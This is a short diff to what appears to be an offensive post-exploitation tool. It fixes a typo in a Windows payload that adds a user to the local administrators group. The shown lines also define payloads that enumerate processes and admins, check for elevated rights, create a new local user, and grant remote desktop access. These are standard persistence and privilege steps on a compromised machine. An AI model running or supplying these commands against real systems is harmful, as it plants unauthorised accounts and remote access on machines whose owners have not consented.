@@ -58,7 +58,7 @@ Load({ payload: "tasklist /m", desc: "Show processes & DLLs", category: "System 
 Load({ payload: "net localgroup administrators", desc: "Prints local admins", category: "System Info"})
 Load({ payload: "net session", desc: "Check for elevated rights (an access denied error will return if not elevated)", category: "System Info"})
 Load({ payload: "net user <PROMPT (username)> <PROMPT (password)> /ADD", desc: "Create new local user",callback: function(bro){question("What user would you like to add?");question("What password would you like to use?");ask.some(questions, bro);}, category: "System Info"})
-Load({desc: "Add user to local admins group",payload: "net localgroups administrators <PROMPT (username)> /add",callback: function(bro){question("What user would you like to add?");ask.some(questions, bro);},category: "System Info"});
+Load({desc: "Add user to local admins group",payload: "net localgroup administrators <PROMPT (username)> /add",callback: function(bro){question("What user would you like to add?");ask.some(questions, bro);},category: "System Info"});
 Load({desc: "Add user to remote desktop group",payload: "net localgroup \"remote desktop users\" <PROMPT (username)> /add",callback: function(bro){question("What user would you like to add?");ask.some(questions, bro);},category: "System Info"});
 
 
